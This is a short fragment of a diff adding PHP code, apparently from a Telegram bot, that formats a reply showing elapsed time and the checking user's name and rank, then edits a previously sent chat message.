+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+  </b>";
+
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+}
+}
